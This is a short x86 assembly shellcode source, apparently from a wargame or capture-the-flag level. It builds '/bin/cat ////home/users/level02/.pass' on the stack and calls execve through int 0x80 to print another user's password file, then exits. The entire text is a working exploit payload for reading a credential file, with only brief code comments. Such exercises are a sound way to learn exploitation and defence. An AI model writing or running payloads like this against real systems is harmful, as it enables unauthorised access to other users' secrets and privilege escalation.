bits 32
	; set all registers to 0
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	; push null byte
	push eax

	; push path to file
	push dword `pass`
	push dword `02/.`
	push dword `evel`
	push dword `rs/l`
	push dword `/use`
	push dword `home`
	push dword `////`

	push eax

	; push bin
	push dword `/cat`
	push dword `/bin`

	push eax
	
	; create argv
	push esp
	add byte [esp], 16
	push esp
	add byte [esp], 8

	; execve syscall
	mov al, 0x0b
	mov ecx, esp
	mov ebx, [esp]
	int 0x80

	; exit
	mov	al, 1
	int 0x80
